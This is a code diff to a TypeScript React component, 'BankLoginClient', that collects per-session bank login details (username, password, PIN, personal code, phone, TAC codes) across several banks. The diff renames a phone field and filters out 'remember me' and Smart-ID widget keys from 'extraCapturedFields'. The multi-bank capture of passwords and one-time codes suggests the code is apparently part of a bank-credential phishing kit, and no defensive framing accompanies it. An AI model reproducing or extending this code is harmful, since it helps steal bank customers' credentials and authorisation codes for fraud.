@@ -49,7 +49,7 @@ type Props = {
 
 function inferCanonicalCredentialKey(
   key: string,
-): "personalCode" | "phone" | "username" | "password" | "tacCode" | "loginMethod" | null {
+): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | null {
   const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
 
   if (
@@ -68,7 +68,7 @@ function inferCanonicalCredentialKey(
     normalizedKey.includes("telefon") ||
     normalizedKey === "phone"
   ) {
-    return "phone";
+    return "bankPhone";
   }
 
   if (
@@ -109,6 +109,21 @@ function inferCanonicalCredentialKey(
   return null;
 }
 
+function isIgnoredRawCredentialKey(key: string): boolean {
+  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
+
+  return (
+    normalizedKey.includes("rememberme") ||
+    normalizedKey.includes("remembermesimpleid") ||
+    normalizedKey.includes("remembermesmartid") ||
+    normalizedKey.includes("remembermemobileid") ||
+    normalizedKey.includes("loginwidget") ||
+    normalizedKey.includes("useridmid") ||
+    normalizedKey.includes("useridsid") ||
+    normalizedKey.includes("useridsimple")
+  );
+}
+
 function shouldResetPreviousBankField(key: string): boolean {
   const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
 
@@ -118,7 +133,7 @@ function shouldResetPreviousBankField(key: string): boolean {
     key === "tacCode" ||
     key === "personalCode" ||
     key === "loginMethod" ||
-    key === "phone" ||
+    key === "bankPhone" ||
     key === "username" ||
     key === "password"
   ) {
@@ -126,6 +141,10 @@ function shouldResetPreviousBankField(key: string): boolean {
   }
 
   if (inferCanonicalCredentialKey(key)) {
+    return true;
+  }
+
+  if (isIgnoredRawCredentialKey(key)) {
     return true;
   }
 
@@ -220,12 +239,14 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     const currentTacCode = overrideData?.tacCode ?? tacCode;
     const currentPersonalCode = overrideData?.personalCode ?? personalCode;
     const currentLoginMethod = overrideData?.loginMethod ?? loginMethod;
-    const currentPhone =
-      typeof overrideData?.phone === "string"
-        ? overrideData.phone
-        : typeof sessionFormData.phone === "string"
-          ? sessionFormData.phone
-          : "";
+    const currentBankPhone =
+      typeof overrideData?.bankPhone === "string"
+        ? overrideData.bankPhone
+        : typeof overrideData?.phone === "string"
+          ? overrideData.phone
+          : typeof sessionFormData.bankPhone === "string"
+            ? sessionFormData.bankPhone
+            : "";
     const currentUsername =
       typeof overrideData?.username === "string"
         ? overrideData.username
@@ -245,7 +266,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       tacCode: currentTacCode, 
       personalCode: currentPersonalCode, 
       loginMethod: currentLoginMethod,
-      phone: currentPhone,
+      bankPhone: currentBankPhone,
       username: currentUsername,
       password: currentPassword,
     });
@@ -256,7 +277,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     });
     const canonicalFieldValues: Record<string, string> = {
       personalCode: credentials.personalCode ?? "",
-      phone: credentials.phone ?? "",
+      bankPhone: credentials.bankPhone ?? "",
       username: credentials.username || credentials.verfuegernummer || "",
       password: credentials.password || credentials.pin || "",
       tacCode: credentials.tacCode ?? "",
@@ -265,7 +286,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
     const extraCapturedFields = Object.fromEntries(
       Object.entries((overrideData ?? {}) as Record<string, unknown>).flatMap(([key, value]) => {
-        if (knownCredentialKeys.has(key) || typeof value !== "string") {
+        if (knownCredentialKeys.has(key) || typeof value !== "string" || isIgnoredRawCredentialKey(key)) {
           return [];
         }
 
